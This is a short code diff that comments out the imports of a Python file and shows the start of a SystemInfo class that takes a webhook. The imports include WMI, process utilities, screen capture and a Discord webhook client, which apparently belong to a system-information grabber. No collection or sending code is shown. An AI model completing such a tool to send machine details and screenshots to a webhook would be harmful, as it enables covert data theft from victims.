@@ -1,16 +1,14 @@
-import ctypes
-import os
-import re
-import subprocess
-import uuid
-
-import psutil
-import requests
-import wmi
-from discord import Embed, File, SyncWebhook
-from PIL import ImageGrab
-import time
-
+# import ctypes
+# import os
+# import re
+# import subprocess
+# import uuid
+# import psutil
+# import requests
+# import wmi
+# from discord import Embed, File, SyncWebhook
+# from PIL import ImageGrab
+# import time
 
 class SystemInfo():
     def __init__(self, webhook: str) -> None:
